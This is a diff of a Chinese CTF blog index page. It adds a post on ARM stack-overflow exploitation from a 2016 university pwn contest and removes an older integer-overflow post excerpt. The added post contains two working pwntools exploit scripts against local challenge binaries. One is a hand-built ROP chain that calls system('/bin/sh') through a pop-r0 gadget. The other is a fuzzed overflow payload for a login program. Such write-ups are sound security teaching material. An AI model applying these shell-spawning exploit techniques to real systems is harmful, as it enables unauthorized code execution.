@@ -129,6 +129,70 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ARM-overflow" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/07/ARM-overflow/">ARM环境下栈溢出攻击初探</a>
+    </h1>
+  
+
+        <a href="/2017/04/07/ARM-overflow/" class="archive-article-date">
+  	<time datetime="2017-04-07T08:34:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-07</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>题目来自于2016年全国高校网安联赛pwn专场。</p>
+<p>参考文献：<a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/107276.html</a></p>
+<p>其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要手工构造ropchain，首先去找system函数，虽然该bin文件去符号化了，但是由于存在/bin/sh字符串，跟踪一下就发现了如下函数。</p>
+<p>这不就是system函数么。。。</p>
+<p>接着用ROPgadget来找一个控制r0寄存器的ropchain就可以了。。如下命令</p>
+<p><code>ROPgadget --binary warmup --only &quot;pop&quot;|grep r0</code></p>
+<p>找到了</p>
+<p><code>0x00020904 : pop {r0, r4, pc}</code></p>
+<p>接着就剩下构造ropchian并执行了，如下脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./warmup'</span>)</div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">p.sendline()</div><div class="line">raw_input()</div><div class="line">pr0_pr4_ret  =<span class="number">0x00020904</span></div><div class="line">bin_sh = <span class="number">0x6C384</span></div><div class="line">system = <span class="number">0x110B4</span></div><div class="line">payload = p32(pr0_pr4_ret)+p32(bin_sh)+p32(<span class="number">0</span>)+p32(system)</div><div class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x70</span>+payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>另一题login，模糊测试一下直接出payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./login'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x61\x86\x18\x5d'</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Code\n\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARM/">ARM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/07/ARM-overflow/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-fastbin-attack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -655,62 +719,6 @@
 
 
   
-    <article id="post-2015-问鼎杯线下PWN" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/08/2015-问鼎杯线下PWN/">2015-问鼎杯线下PWN</a>
-    </h1>
-  
-
-        <a href="/2016/06/08/2015-问鼎杯线下PWN/" class="archive-article-date">
-  	<time datetime="2016-06-08T22:39:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-06-08</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这题当时没做出了哎。。好吧，其实考察点是整型溢出。。。挺有价值的一题题目。<br>题目地址：<a href="https://github.com/Winter3un/ctf_task">https://github.com/Winter3un/ctf_task</a><br>通过逆向得知，题目需要密码，而密码是通过一个算法得到的，要输入一个字符串满足这个算法，但是在32位内，我们的任何输入都满足不了条件，突然发现这边可以进行整型溢出（超过32位的数据，寄存器将丢弃）<br>那么我们可以构造类似于0x1ae312d386d209这样的数据，高于32位的数据将会被丢弃。即<code>0x1ae312d386d209</code> == <code>0xD386D209</code><br>exp如下:<br>
-        
-          <a class="article-more-a" href="/2016/06/08/2015-问鼎杯线下PWN/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/06/08/2015-问鼎杯线下PWN/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
@@ -769,6 +777,22 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">AWD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ARM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">code</a>
               </li>
              
@@ -781,23 +805,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">AWD</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">pwn</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">bctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">Writeup</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">writeup</a>
+                <a href="javascript:void(0)">arm</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -805,11 +813,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">arm</a>
+                <a href="javascript:void(0)">writeup</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">heap</a>
+                <a href="javascript:void(0)">Writeup</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -817,19 +825,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">wargame</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">note</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ARM</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -838,6 +834,18 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">fmt</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">heap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">note</a>
               </li>
             
             <div class="clearfix"></div>
